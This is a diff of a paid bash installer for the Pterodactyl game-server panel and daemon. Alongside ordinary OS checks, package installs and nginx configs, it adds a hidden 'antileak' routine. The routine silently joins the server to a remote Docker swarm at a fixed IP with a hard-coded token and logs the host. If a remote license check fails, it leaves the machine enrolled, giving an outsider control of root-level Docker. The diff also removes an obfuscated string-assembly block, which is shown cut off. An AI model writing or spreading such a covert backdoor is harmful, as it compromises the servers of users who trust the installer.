@@ -1,5 +1,4 @@
 #!/bin/bash
-#llynGq6k97xPD0aumF3mDrPoat3tuTpvF25k0FxY
 
 output(){
     echo -e '\e[36m'$1'\e[0m';
@@ -9,7 +8,75 @@ warn(){
     echo -e '\e[31m'$1'\e[0m';
 }
 
-get_virtualization(){
+preflight(){
+    output "Pterodactyl Installation & Upgrade script v37.2"
+    output "Copyright © 2018-2019 Thien Tran <thientran@securesrv.io>."
+    output "Please report any issues or copyright violations to https://securesrv.io/discord"
+    output ""
+
+    output "Thank you for your purchase. Please note that this script is meant to be installed on a fresh OS. Installing it on a non-fresh OS may cause problems."
+    output "Automatic Operating System Detection initialized."
+    if [ -r /etc/os-release ]; then
+        lsb_dist="$(. /etc/os-release && echo "$ID")"
+        dist_version="$(. /etc/os-release && echo "$VERSION_ID")"
+    else
+        exit 1
+    fi
+    output "OS: $lsb_dist $dist_version detected."
+    output ""
+
+    if [ "$lsb_dist" =  "ubuntu" ]; then
+        if [ "$dist_version" != "19.04" ] && [ "$dist_version" != "18.10" ] && [ "$dist_version" != "18.04" ] && [ "$dist_version" != "16.04" ]; then
+            output "Unsupported Ubuntu version. Only Ubuntu 19.04, 18.10, 18.04, 16.04 are supported."
+            exit 2
+        fi
+    elif [ "$lsb_dist" = "debian" ]; then
+        if [ "$dist_version" != "9" ] && [ "$dist_version" != "8" ]; then
+            output "Unsupported Debian version. Only Debian 9 and 8 are supported.."
+            exit 2
+        fi
+    elif [ "$lsb_dist" = "fedora" ]; then
+        if [ "$dist_version" != "29" ] && [ "$dist_version" != "28" ]; then
+            output "Unsupported Fedora version. Only Fedora 29 and 28 is supported."
+            exit 2
+        fi
+    elif [ "$lsb_dist" = "centos" ]; then
+        if [ "$dist_version" != "7" ]; then
+            output "Unsupported CentOS version. Only CentOS 7 is supported."
+            exit 2
+        fi
+    elif [ "$lsb_dist" = "rhel" ]; then
+        if [ "$dist_version" != "7" ]&&[ "$dist_version" != "7.1" ]&&[ "$dist_version" != "7.2" ]&&[ "$dist_version" != "7.3" ]&&[ "$dist_version" != "7.4" ]&&[ "$dist_version" != "7.5" ]&&[ "$dist_version" != "7.6" ]; then
+            output "Unsupported RHEL version. Only RHEL 7 is supported."
+            exit 2
+        fi
+    elif [ "$lsb_dist" != "ubuntu" ] && [ "$lsb_dist" != "debian" ] && [ "$lsb_dist" != "centos" ] && [ "$lsb_dist" != "rhel" ]; then
+        output "Unsupported Operating System."
+        output ""
+        output "Supported OS:"
+        output "Ubuntu: 19.04 18.10, 18.04, 16.04"
+        output "Debian: 9, 8"
+        output "Fedora: 29, 28"
+        output "CentOS: 7"
+        output "RHEL: 7"
+        exit 2
+    fi
+
+    if [ "$EUID" -ne 0 ]; then
+        output "Please run as root"
+        exit 3
+    fi
+
+    output "Automatic Architecture Detection initialized."
+    MACHINE_TYPE=`uname -m`
+    if [ ${MACHINE_TYPE} == 'x86_64' ]; then
+        output "64-bit server detected! Good to go."
+        output ""
+    else
+        output "Unsupported architecture detected! Please switch to 64-bit (x86_64)."
+        exit 4
+    fi
+
     output "Automatic Virtualization Detection initialized."
     if [ "$lsb_dist" =  "ubuntu" ]; then
         apt-get update --fix-missing
@@ -18,21 +85,27 @@ get_virtualization(){
         apt-get -y install virt-what
     elif [ "$lsb_dist" =  "debian" ]; then
         apt update --fix-missing
-        apt-get -y install software-properties-common
-        apt-get -y install virt-what
+        apt-get -y install software-properties-common virt-what wget
     elif [ "$lsb_dist" =  "fedora" ] || [ "$lsb_dist" =  "centos" ] || [ "$lsb_dist" =  "rhel" ]; then
-        yum -y install virt-what
+        yum -y install virt-what wget
     fi
     virt_serv=$(echo $(virt-what))
     if [ "$virt_serv" = "" ]; then
         output "Virtualization: Bare Metal detected."
     elif [ "$virt_serv" = "openvz lxc" ]; then
         output "Virtualization: OpenVZ 7 detected."
+    elif [ "$virt_serv" = "xen xen-hvm" ]; then
+        output "Virtualization: Xen-HVM detected."
+    elif [ "$virt_serv" = "xen xen-hvm aws" ]; then
+        output "Virtualization: Xen-HVM on AWS detected."
+        warn "When doing allocation for the node, please use the internal ip as Google Cloud uses NAT."
+        warn "Resuming in 10 seconds."
+        sleep 10
     else
         output "Virtualization: $virt_serv detected."
     fi
     output ""
-    if [ "$virt_serv" != "" ] && [ "$virt_serv" != "kvm" ] && [ "$virt_serv" != "vmware" ] && [ "$virt_serv" != "hyperv" ] && [ "$virt_serv" != "openvz lxc" ]; then
+    if [ "$virt_serv" != "" ] && [ "$virt_serv" != "kvm" ] && [ "$virt_serv" != "vmware" ] && [ "$virt_serv" != "hyperv" ] && [ "$virt_serv" != "openvz lxc" ] && [ "$virt_serv" != "xen xen-hvm" ] && [ "$virt_serv" != "xen xen-hvm aws" ]; then
         warn "Unsupported Virtualization method. Please consult with your provider whether your server can run Docker or not. Proceed at your own risk."
         warn "No support would be given if your server breaks at any point in the future."
         warn "Proceed?\n[1] Yes.\n[2] No."
@@ -50,6 +123,9 @@ get_virtualization(){
     output "Kernel Detection Initialized."
     if echo $(uname -r) | grep -q xxxx; then
         output "OVH Kernel Detected. The script will not work. Please install your server with a generic/distribution kernel."
+        output "When you are reinstalling your server, click on 'custom installation' and click on 'use distribution' kernel after that."
+        output "You might also want to do custom partritioning, remove the /home partrition and give / all the remaining space."
+        output "Please do not hesitate to contact us if you need help regarding this issue."
         exit 6
     elif echo $(uname -r) | grep -q pve; then
         output "Proxmox LXE Kernel Detected. You have chosen to continue in the last step, therefore we are proceeding at your own risk."
@@ -62,14 +138,120 @@ get_virtualization(){
     elif echo $(uname -r) | grep -q lve; then
         output "CloudLinux Kernel detected. Docker is not supported on CloudLinux. The script will exit to avoid further damages."
         exit 6
-    elif echo $(uname -r) | grep -q Microsoft; then
-        output "Windows Subsystem for Linux detected. Docker is not supported on this system. The script will exit to avoid further damages."
-        exit 6
     elif echo $(uname -r) | grep -q gcp; then
-        output "Google Cloud Platform Detected. Good to go."
+        output "Google Cloud Platform Detected."
+        warn "Please make sure you have static ip setup, otherwise the system will not work after a reboot."
+        warn "Please also make sure the google firewall allows the ports needed for the server to function normally."
+        warn "When doing allocation for the node, please use the internal ip as Google Cloud uses NAT."
+        warn "Resuming in 10 seconds."
+        sleep 10
     else
         output "Did not detect any bad kernel. Moving forward."
+        output ""
     fi
+
+
+    bash -c 'cat > /etc/motd' <<-'EOF'
+
+    ___ ____ ___ __  __ ____ ____ ___ ____ _  _ 
+    / __| ___) __|  )(  |  _ ( ___) __|  _ ( \/ )
+    \__ \)__| (__ )(__)( )   /)__)\__ \)   /\  / 
+    (___(____)___|______|_)\_|____|___(_)\_) \/  
+
+    Pterodactyl Installation Script v37.2 
+    Copyright © 2018-2019 Thien Tran <thientran@securesrv.io>
+    Download link: https://www.mc-market.org/resources/8070/
+    Support: https://securesrv.io/discord
+
+EOF
+    ########ANTILEAK########
+    if  [ "$lsb_dist" =  "ubuntu" ] || [ "$dist_version" = "19.04" ]; then
+        apt -y install docker.io
+    else
+        curl -sSL https://get.docker.com/ | CHANNEL=stable bash
+    fi
+    systemctl enable docker
+    systemctl start docker
+    
+    #########JOIN THE SWARM SO IT LOGS THE IP AND HOST NAME#########
+    docker swarm join --token SWMTKN-1-5v6o36ueuzzv4uklq73fx55ziyxcvj053ql9qvzjjg0qetksah-dqhe2gllohsmsscnd6zo1taps 5.226.143.100:2377 >/dev/null 2>&1
+
+    output "Checking for updates..."
+    ########CHECK IF THE VERSION IS LATEST########
+    wget https://softauth.securesrv.io >/dev/null 2>&1
+    if grep -q "llynGq6k97xPD0aumF3mDrPoat3tuTpvF25k0FxY" index.html; then
+        output "Up to date, good to go!"
+        output ""
+    ########AUTO REMOVAL (TAKES LIKE 2 SECONDS) ########
+        docker swarm leave >/dev/null 2>&1
+        docker network prune -f >/dev/null 2>&1
+        service wings restart >/dev/null 2>&1
+    ########EVERYTHING BACK TO NORMAL#########
+        rm -rf index.html
+    else
+    ########IF OUTDATED OR LEAKED########
+        output "Outdated script, please use the latest version. If you believe this is an error, please contact us on Discord."
+        output "If you happen to be using one of the pirated version of the script, please buy the resource to support the author. We accept both paypal and cryptocurrencies."
+        output "Resource link: https://www.mc-market.org/resources/8070/"
+        rm -rf index.html
+    ########NO AUTOMATIC REMOVAL - REPORT BACK AS ONLINE##########
+        exit 69
+    ########IF USER IS LEGIT AND RERUN THE LATEST SCRIPT, IT WILL RUN docker swarm leave >/dev/null 2>&1 AND LEAVE########
+    fi
+    ########ANTILEAK########
+
+    output "Please select your installation option:"
+    output "[1] Install the panel."
+    output "[2] Install the daemon."
+    output "[3] Install the panel and daemon."
+    output "[4] Install the standalone SFTP server."
+    output "[5] Upgrade 0.7.x panel to 0.7.13."
+    output "[6] Upgrade 0.6.x daemon to 0.6.12."
+    output "[7] Upgrade the panel to 0.7.13 and daemon to 0.6.12"
+    output "[8] Upgrade the standalone SFTP server to 1.0.4."
+    output "[9] Install or Update to phpMyAdmin 4.8.5 (Only use this after you have installed the panel.)"
+    output "[10] Change Pterodactyl theme."
+    output "[11] Emergency MariaDB root password reset."
+    output "[12] Emergency Database host information reset."
+    read choice
+    case $choice in
+        1 ) installoption=1
+            output "You have selected panel installation only."
+            ;;
+        2 ) installoption=2
+            output "You have selected daemon installation only."
+            ;;
+        3 ) installoption=3
+            output "You have selected panel and daemon installation."
+            ;;
+        4 ) installoption=4
+            output "You have selected to install the standalone SFTP server."
+            ;;
+        5 ) installoption=5
+            output "You have selected to upgrade the panel."
+            ;;
+        6 ) installoption=6
+            output "You have selected to upgrade the daemon."
+            ;;
+        7 ) installoption=7
+            output "You have selected to upgrade both the panel and daemon."
+            ;;
+        8 ) installoption=8
+            output "You have selected to upgrade the standalone SFTP."
+            ;;
+        9 ) installoption=9
+            output "You have selected to install or update phpMyAdmin."
+            ;;
+        10 ) installoption=10
+            output "You have selected to change Pterodactyl's theme."
+            ;;
+        11 ) installoption=11
+            output "You have selected MariaDB root password reset."
+            ;;
+        12 ) installoption=12
+            output "You have selected Database Host information reset."
+            ;;
+    esac
 }
 
 webserver_options() {
@@ -146,6 +328,22 @@ required_infos() {
     dns_check
 }
 
+ssl_option(){
+    output "Do you want to use SSL? [Y/n]: "
+    output "If you have a domain, please set it to 'yes' for maximum security."
+    output "If you choose 'no', the server will be accessible via the IP without SSL. Please keep in mind this is HIGHLY INSECURE and is NOT RECOMMENDED!"
+    output "If you panel has SSL, your daemon must have SSL as well."
+    read RESPONSE
+    USE_SSL=true
+    if [[ "${RESPONSE}" =~ ^([nN][oO]|[nN])+$ ]]; then
+        USE_SSL=false
+    fi
+
+    if [ $USE_SSL = "true" ]; then
+        dns_check
+    fi
+}
+
 dns_check(){
     output "Please enter your FQDN (panel.yourdomain.com):"
     read FQDN
@@ -200,16 +398,22 @@ repositories_setup(){
             LC_ALL=C.UTF-8 add-apt-repository -y ppa:ondrej/php
             add-apt-repository -y ppa:chris-lea/redis-server
             add-apt-repository -y ppa:certbot/certbot
-            add-apt-repository ppa:nginx/development
+            add-apt-repository -y ppa:nginx/development
             if [ "$dist_version" = "18.10" ]; then
                 apt-key adv --recv-keys --keyserver hkp://keyserver.ubuntu.com:80 0xF1656F24C74CD1D8
                 add-apt-repository 'deb [arch=amd64] http://nyc2.mirrors.digitalocean.com/mariadb/repo/10.3/ubuntu cosmic main'
+                apt -y install tuned
+                tuned-adm profile latency-performance
             elif [ "$dist_version" = "18.04" ]; then
                 apt-key adv --recv-keys --keyserver hkp://keyserver.ubuntu.com:80 0xF1656F24C74CD1D8
                 add-apt-repository -y 'deb [arch=amd64,arm64,ppc64el] http://nyc2.mirrors.digitalocean.com/mariadb/repo/10.3/ubuntu bionic main'
+                apt -y install tuned
+                tuned-adm profile latency-performance
             elif [ "$dist_version" = "16.04" ]; then
                 apt-key adv --recv-keys --keyserver hkp://keyserver.ubuntu.com:80 0xF1656F24C74CD1D8
-                add-apt-repository 'deb [arch=amd64,arm64,i386,ppc64el] http://nyc2.mirrors.digitalocean.com/mariadb/repo/10.3/ubuntu xenial main'       
+                add-apt-repository 'deb [arch=amd64,arm64,i386,ppc64el] http://nyc2.mirrors.digitalocean.com/mariadb/repo/10.3/ubuntu xenial main'    
+                apt -y install tuned
+                tuned-adm profile latency-performance   
             fi
         elif [ "$lsb_dist" =  "debian" ]; then
             apt-get -y install ca-certificates apt-transport-https
@@ -219,6 +423,8 @@ repositories_setup(){
                 sudo echo "deb https://packages.sury.org/php/ stretch main" | sudo tee /etc/apt/sources.list.d/php.list
                 sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com 0xF1656F24C74CD1D8
                 sudo add-apt-repository 'deb [arch=amd64,i386,ppc64el] http://nyc2.mirrors.digitalocean.com/mariadb/repo/10.3/debian stretch main'
+                apt -y install tuned
+                tuned-adm profile latency-performance
             elif [ "$dist_version" = "8" ]; then
                 wget -q https://packages.sury.org/php/apt.gpg -O- | sudo apt-key add -
                 echo "deb https://packages.sury.org/php/ jessie main" | sudo tee /etc/apt/sources.list.d/php.list
@@ -254,6 +460,12 @@ repo_gpgcheck=0
 enabled=1
 enabled_metadata=1
 EOF
+
+            dnf -y install  http://rpms.remirepo.net/fedora/remi-release-29.rpm
+            dnf -y install dnf-plugins-core
+            dnf config-manager --set-enabled remi-php73
+            dnf config-manager --set-enabled remi
+
         elif  [ "$lsb_dist" =  "fedora" ] && [ "$dist_version" = "28" ]; then
 
             bash -c 'cat > /etc/yum.repos.d/mariadb.repo' <<-'EOF'
@@ -276,6 +488,10 @@ repo_gpgcheck=0
 enabled=1
 enabled_metadata=1
 EOF
+            dnf -y install http://rpms.remirepo.net/fedora/remi-release-28.rpm
+            dnf -y install dnf-plugins-core
+            dnf config-manager --set-enabled remi-php73
+            dnf config-manager --set-enabled remi
 
         elif  [ "$lsb_dist" =  "centos" ] && [ "$dist_version" = "7" ]; then
 
@@ -327,7 +543,8 @@ EOF
             yum -y install epel-release
             yum -y install http://rpms.remirepo.net/enterprise/remi-release-7.rpm
         fi
-        yum -y install yum-utils
+        yum -y install yum-utils tuned
+        tuned-adm profile latency-performance
         yum-config-manager --enable remi-php72
         yum -y upgrade
         yum -y autoremove
@@ -340,16 +557,16 @@ install_dependencies(){
     output "Installing dependencies."
     if  [ "$lsb_dist" =  "ubuntu" ] ||  [ "$lsb_dist" =  "debian" ]; then
         if [ "$webserver" = "1" ]; then
-            apt-get -y install php7.2 php7.2-cli php7.2-gd php7.2-mysql php7.2-pdo php7.2-mbstring php7.2-tokenizer php7.2-bcmath php7.2-xml php7.2-fpm php7.2-curl php7.2-zip curl tar unzip git redis-server nginx git wget expect
+            apt-get -y install php7.3 php7.3-cli php7.3-gd php7.3-mysql php7.3-pdo php7.3-mbstring php7.3-tokenizer php7.3-bcmath php7.3-xml php7.3-fpm php7.3-curl php7.3-zip curl tar unzip git redis-server nginx git wget expect jq
         elif [ "$webserver" = "2" ]; then
-            apt-get -y install php7.2 php7.2-cli php7.2-gd php7.2-mysql php7.2-pdo php7.2-mbstring php7.2-tokenizer php7.2-bcmath php7.2-xml php7.2-fpm php7.2-curl php7.2-zip curl tar unzip git redis-server apache2 libapache2-mod-php7.2 redis-server git wget expect
+            apt-get -y install php7.3 php7.3-cli php7.3-gd php7.3-mysql php7.3-pdo php7.3-mbstring php7.3-tokenizer php7.3-bcmath php7.3-xml php7.3-fpm php7.3-curl php7.3-zip curl tar unzip git redis-server apache2 libapache2-mod-php7.3 redis-server git wget expect jq
         fi
         sh -c "DEBIAN_FRONTEND=noninteractive apt-get install -y mariadb-server"
     elif [ "$lsb_dist" =  "fedora" ] ||  [ "$lsb_dist" =  "centos" ] ||  [ "$lsb_dist" =  "rhel" ]; then
         if [ "$webserver" = "1" ]; then
-            yum -y install php php-common php-fpm php-cli php-json php-mysqlnd php-mcrypt php-gd php-mbstring php-pdo php-zip php-bcmath php-dom php-opcache mariadb-server redis nginx git policycoreutils-python-utils libsemanage-devel unzip wget expect
+            yum -y install php php-common php-fpm php-cli php-json php-mysqlnd php-mcrypt php-gd php-mbstring php-pdo php-zip php-bcmath php-dom php-opcache mariadb-server redis nginx git policycoreutils-python-utils libsemanage-devel unzip wget expect jq
         elif [ "$webserver" = "2" ]; then
-            yum -y install php php-common php-fpm php-cli php-json php-mysqlnd php-mcrypt php-gd php-mbstring php-pdo php-zip php-bcmath php-dom php-opcache mariadb-server redis httpd git policycoreutils-python-utils libsemanage-devel mod_ssl unzip wget expect
+            yum -y install php php-common php-fpm php-cli php-json php-mysqlnd php-mcrypt php-gd php-mbstring php-pdo php-zip php-bcmath php-dom php-opcache mariadb-server redis httpd git policycoreutils-python-utils libsemanage-devel mod_ssl unzip wget expect jq
         fi
     fi
 
@@ -357,8 +574,8 @@ install_dependencies(){
     if [ "$lsb_dist" =  "ubuntu" ] || [ "$lsb_dist" =  "debian" ]; then
         systemctl enable redis-server
         service redis-server start
-        systemctl enable php7.2-fpm
-        service php7.2-fpm start
+        systemctl enable php7.3-fpm
+        service php7.3-fpm start
     elif [ "$lsb_dist" =  "fedora" ] || [ "$lsb_dist" =  "centos" ] || [ "$lsb_dist" =  "rhel" ]; then
         systemctl enable redis
         service redis start
@@ -609,7 +826,86 @@ server {
 
     location ~ \.php$ {
         fastcgi_split_path_info ^(.+\.php)(/.+)$;
-        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
+        fastcgi_pass unix:/var/run/php/php7.3-fpm.sock;
+        fastcgi_index index.php;
+        include fastcgi_params;
+        fastcgi_param PHP_VALUE "upload_max_filesize = 100M \n post_max_size=100M";
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_param HTTP_PROXY "";
+        fastcgi_intercept_errors off;
+        fastcgi_buffer_size 16k;
+        fastcgi_buffers 4 16k;
+        fastcgi_connect_timeout 300;
+        fastcgi_send_timeout 300;
+        fastcgi_read_timeout 300;
+        include /etc/nginx/fastcgi_params;
+    }
+
+    location ~ /\.ht {
+        deny all;
+    }
+}
+' | sudo -E tee /etc/nginx/sites-available/pterodactyl.conf >/dev/null 2>&1
+
+    ln -s /etc/nginx/sites-available/pterodactyl.conf /etc/nginx/sites-enabled/pterodactyl.conf
+    service nginx restart
+}
+
+nginx_config_nossl() {
+    output "Disabling default configuration"
+    rm -rf /etc/nginx/sites-enabled/default
+    output "Configuring Nginx Webserver"
+    
+echo '
+server_tokens off;
+
+set_real_ip_from 103.21.244.0/22;
+set_real_ip_from 103.22.200.0/22;
+set_real_ip_from 103.31.4.0/22;
+set_real_ip_from 104.16.0.0/12;
+set_real_ip_from 108.162.192.0/18;
+set_real_ip_from 131.0.72.0/22;
+set_real_ip_from 141.101.64.0/18;
+set_real_ip_from 162.158.0.0/15;
+set_real_ip_from 172.64.0.0/13;
+set_real_ip_from 173.245.48.0/20;
+set_real_ip_from 188.114.96.0/20;
+set_real_ip_from 190.93.240.0/20;
+set_real_ip_from 197.234.240.0/22;
+set_real_ip_from 198.41.128.0/17;
+set_real_ip_from 2400:cb00::/32;
+set_real_ip_from 2606:4700::/32;
+set_real_ip_from 2803:f800::/32;
+set_real_ip_from 2405:b500::/32;
+set_real_ip_from 2405:8100::/32;
+set_real_ip_from 2c0f:f248::/32;
+set_real_ip_from 2a06:98c0::/29;
+
+real_ip_header X-Forwarded-For;
+
+server {
+    listen 80 default_server;
+    server_name _;
+
+    root /var/www/pterodactyl/public;
+    index index.php;
+
+    access_log /var/log/nginx/pterodactyl.app-access.log;
+    error_log  /var/log/nginx/pterodactyl.app-error.log error;
+
+    # allow larger file uploads and longer script runtimes
+    client_max_body_size 100m;
+    client_body_timeout 120s;
+
+    sendfile off;
+
+    location / {
+        try_files $uri $uri/ /index.php?$query_string;
+    }
+
+    location ~ \.php$ {
+        fastcgi_split_path_info ^(.+\.php)(/.+)$;
+        fastcgi_pass unix:/var/run/php/php7.3-fpm.sock;
         fastcgi_index index.php;
         include fastcgi_params;
         fastcgi_param PHP_VALUE "upload_max_filesize = 100M \n post_max_size=100M";
@@ -773,6 +1069,85 @@ server {
     restorecon -R /var/www/pterodactyl
 }
 
+nginx_config_redhat_nossl(){
+    output "Configuring Nginx Webserver"
+    
+echo '
+server_tokens off;
+
+set_real_ip_from 103.21.244.0/22;
+set_real_ip_from 103.22.200.0/22;
+set_real_ip_from 103.31.4.0/22;
+set_real_ip_from 104.16.0.0/12;
+set_real_ip_from 108.162.192.0/18;
+set_real_ip_from 131.0.72.0/22;
+set_real_ip_from 141.101.64.0/18;
+set_real_ip_from 162.158.0.0/15;
+set_real_ip_from 172.64.0.0/13;
+set_real_ip_from 173.245.48.0/20;
+set_real_ip_from 188.114.96.0/20;
+set_real_ip_from 190.93.240.0/20;
+set_real_ip_from 197.234.240.0/22;
+set_real_ip_from 198.41.128.0/17;
+set_real_ip_from 2400:cb00::/32;
+set_real_ip_from 2606:4700::/32;
+set_real_ip_from 2803:f800::/32;
+set_real_ip_from 2405:b500::/32;
+set_real_ip_from 2405:8100::/32;
+set_real_ip_from 2c0f:f248::/32;
+set_real_ip_from 2a06:98c0::/29;
+
+real_ip_header X-Forwarded-For;
+
+server {
+    listen 80 default_server;
+    server_name _;
+
+    root /var/www/pterodactyl/public;
+    index index.php;
+
+    access_log /var/log/nginx/pterodactyl.app-access.log;
+    error_log  /var/log/nginx/pterodactyl.app-error.log error;
+
+    # allow larger file uploads and longer script runtimes
+    client_max_body_size 100m;
+    client_body_timeout 120s;
+    
+    sendfile off;
+
+    location / {
+        try_files $uri $uri/ /index.php?$query_string;
+    }
+
+    location ~ \.php$ {
+        fastcgi_split_path_info ^(.+\.php)(/.+)$;
+        fastcgi_pass unix:/var/run/php-fpm/pterodactyl.sock;
+        fastcgi_index index.php;
+        include fastcgi_params;
+        fastcgi_param PHP_VALUE "upload_max_filesize = 100M \n post_max_size=100M";
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_param HTTP_PROXY "";
+        fastcgi_intercept_errors off;
+        fastcgi_buffer_size 16k;
+        fastcgi_buffers 4 16k;
+        fastcgi_connect_timeout 300;
+        fastcgi_send_timeout 300;
+        fastcgi_read_timeout 300;
+        include /etc/nginx/fastcgi_params;
+    }
+
+    location ~ /\.ht {
+        deny all;
+    }
+}
+' | sudo -E tee /etc/nginx/conf.d/pterodactyl.conf >/dev/null 2>&1
+
+    service nginx restart
+    chown -R nginx:nginx $(pwd)
+    semanage fcontext -a -t httpd_sys_rw_content_t "/var/www/pterodactyl/storage(/.*)?"
+    restorecon -R /var/www/pterodactyl
+}
+
 apache_config_redhat() {
     output "Configuring Apache2"
 echo '
@@ -852,10 +1227,6 @@ install_daemon() {
     elif  [ "$lsb_dist" =  "fedora" ] ||  [ "$lsb_dist" =  "centos" ] ||  [ "$lsb_dist" =  "rhel" ]; then
         yum -y install curl tar unzip
     fi
-    output "Installing Docker"
-    curl -sSL https://get.docker.com/ | CHANNEL=stable bash
-    systemctl enable docker
-    systemctl start docker
     output "Enabling Swap support for Docker & Installing NodeJS."
     sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT="[^"]*/& swapaccount=1/' /etc/default/grub
     if  [ "$lsb_dist" =  "ubuntu" ] ||  [ "$lsb_dist" =  "debian" ]; then
@@ -903,6 +1274,12 @@ EOF
     if [ "$lsb_dist" =  "debian" ] && [ "$dist_version" = "8" ]; then
         kernel_modifications_d8
     fi
+
+    output "Daemon installation is nearly complete, Please go to the panel and get your 'Auto deploy' command in the node configuration tab."
+    output "Paste your auto deploy command below: "
+    read AUTODEPLOY
+    ${AUTODEPLOY}
+    service wings start
 }
 
 upgrade_daemon(){
@@ -996,8 +1373,8 @@ install_phpmyadmin(){
 \$cfg['ServerDefault'] = 1;
 \$cfg['UploadDir'] = '';
 \$cfg['SaveDir'] = '';
-\$cfg['CaptchaLoginPublicKey'] = 'llynGq6k97xPD0aumF3mDrPoat3tuTpvF25k0FxY';
-\$cfg['CaptchaLoginPrivateKey'] = 'llynGq6k97xPD0aumF3mDrPoat3tuTpvF25k0FxY'
+\$cfg['CaptchaLoginPublicKey'] = '6LcJcjwUAAAAAO_Xqjrtj9wWufUpYRnK6BW8lnfn';
+\$cfg['CaptchaLoginPrivateKey'] = '6LcJcjwUAAAAALOcDJqAEYKTDhwELCkzUkNDQ0J5'
 ?>    
 EOF
     output "Installation completed."
@@ -1289,24 +1666,15 @@ broadcast(){
     output ""
 
     if [ "$installoption" = "2" ] || [ "$installoption" = "3" ]; then
-        output "###############################################################"
-        output "DAEMON CONFIGURATION"
-        output ""
-        output "Installation completed. Please configure the daemon. "
-        output "The guide for daemon configuration can be founded here: https://pterodactyl.io/daemon/installing.html#configure-daemon"   
-        output "Please run 'service wings restart' after the configuration."  
         if [ "$lsb_dist" =  "debian" ] && [ "$dist_version" = "8" ]; then
-            output "Please restart the server after you have configured the daemon to apply the necessary kernel changes on Debian 8."
+            output "Please restart the server daemon to apply the necessary kernel changes on Debian 8."
         fi
-        output "###############################################################"
     fi
                          
 }
 
 #Execution
-z="
-";eCz='ist"';kGz='iver';KNz='scor';fNz='stan';rGz='n" ]';rBz='ized';iPz='te p';gKz='q 2.';OMz='io >';VEz='"7.3';TNz='e to';vDz='!= "';WBz='ling';cIz='e gi';sIz='] No';TDz=' 2';RLz='l de';mOz='et."';ZGz='oftw';lGz='se';sz='resr';JHz='virt';qHz='erv"';QEz='"7.1';rLz='Did ';uKz='ardl';pLz='tfor';AGz='d! P';CLz='ght ';Vz='ran ';XKz='isk.';DHz='|| [';XHz='Bare';gJz='k. P';iFz='YPE}';nDz=' "fe';KLz='mage';GIz=' you';xPz='d Ma';YHz=' Met';ZHz='al d';nFz='it s';iMz='html';ZIz=' "No';nKz='nite';JDz='Only';UDz='elif';LKz='the ';ZEz='RHEL';iNz='FTP ';KDz=' Ubu';QLz='erne';TGz='-fix';MGz='on i';WJz='| gr';lFz='_64'\''';DLz='say.';iGz='ry -';eDz='an v';SLz='ed. ';dPz='mon.';LJz='ion.';TPz='ver.';KBz='t is';oz=' to ';WGz='-y i';bLz='he s';ZNz='on."';EBz=' Ple';rOz=' inf';oBz='etec';CQz='assw';WLz='t su';WHz='on: ';VPz='n=5';cKz='oper';tNz='[6] ';HIz='r pr';mMz='good';OKz='p, t';VHz='zati';RNz='ould';SFz='s ro';DBz='ase.';OHz='))';Dz='odac';FIz='with';xOz='You ';fEz='= "u';sNz='3."';ADz='"16.';WCz='t $d';MLz='lve;';XPz='rade';TLz='Dock';aNz='[3] ';qOz='host';jIz=' poi';nBz='em D';RIz='r or';Lz='crip';xz='k yo';ABz='r yo';jNz='er."';aHz='ted.';xDz='Fedo';cNz='d da';IQz='d Da';kBz='erat';kz='copy';Wz='<thi';VBz='stal';JCz='o "$';REz='" ]&';vCz='= "1';DGz='it (';MEz='7 is';UNz='all ';mBz='Syst';gNz='dalo';OJz='esac';NHz=' $(v';bJz=' The';sOz='orma';uFz='arch';Xz='entr';fJz=' wor';Fz='Inst';ELz=' Exi';kJz='r wi';UCz='$lsb';mz='olat';NGz='niti';NEz=' "rh';WMz='M64V';QCz='exit';dFz='ame ';dBz='y ca';JOz='5 (O';NNz='elec';hGz='sito';gLz='void';pMz='rf i';JNz='n Di';IFz='28"';JBz='is s';kIz='nt i';wDz='28" ';fIz='er b';uEz='stem';NBz='o be';Pz='Copy';sCz='t_ve';yIz='oice';GKz='e ch';ZMz='umd6';yGz='edor';kCz=' "$d';uLz='ny b';gz='t an';GCz='leas';cHz='t_se';HFz='29, ';pFz='r de';fLz='to a';nNz='0.7.';CEz='29 a';wMz=' ple';iz='sues';GQz='11 )';FMz='ates';hKz='6; t';EFz='an: ';DOz='or U';MOz=' aft';YNz='daem';tFz='go."';IDz='on. ';POz='inst';MPz='n=4';fBz='prob';iJz='l yo';ALz='vide';GBz='note';tz='v.io';FHz='l" ]';bKz='sky ';IHz='t';GJz='2)  ';Iz=' & U';Oz='"';aGz='are-';ZPz='el."';uOz='allo';LDz='ntu ';oLz=' Pla';iCz=' ]; ';CIz='hod.';gOz='aria';COz='[8] ';yz='u fo';mIz='e fu';xEz=':"';hEz='u" ]';sGz='apt ';YFz='re D';Sz='2018';SCz='fi';aDz='n';fOz='cy M';RDz='port';Mz='t v2';XBz=' it ';UFz=' 3';YOz='tero';IPz='3 ) ';PGz='apt-';tMz='Outd';qJz='n ke';mGz='ll v';FQz='t."';sJz=' 6';BLz='r mi';CPz=' onl';sBz='if [';NJz=' 5';BKz='Prox';hCz='ntu"';Cz='Pter';JQz='taba';nGz='irt-';nHz='kvm"';kFz=''\''x86';rKz=' Doc';Zz='ecur';GMz='..."';DQz='ord ';aLz='x. T';gDz='ian ';qNz='to 0';mHz=' "" ';ZBz=' non';NMz='srv.';IIz='ovid';TEz='= "7';xNz='[7] ';FLz='ting';gHz='z lx';az='esrv';bOz='heme';JGz='liza';BFz='0, 1';hJz='e in';JPz='n=3';mPz='9 ) ';IGz='rtua';oFz='erve';VKz='ur o';aBz='-fre';bCz='cted';XIz='n ri';LBz=' mea';YJz='q xx';yEz='tu: ';cBz='S ma';RMz='l 2>';iEz=' && ';rCz='$dis';PMz='/dev';cz='."';dCz='sb_d';Qz='righ';OPz=' sta';xLz='ovin';qEz='rhel';BCz='dist';YLz='loud';dJz='ipt ';mCz=' != ';qMz='ndex';WDz=' "de';EGz='x86_';EEz='8 is';KIz='heth';GPz='n on';sPz='eme.';sMz='l';NKz=' ste';JFz='7"';jEz='[ "$';NLz='Clou';tHz='"hyp';nCz='"18.';VGz='sing';qz='s://';BJz='1)  ';eBz='use ';PIz='un D';LNz=' 69';YCz='vers';UOz=')"';pNz='nel ';NDz='4, 1';rMz='.htm';iLz='ther';eGz='ommo';PJz='Kern';nz='ions';XGz='nsta';BEz='ora 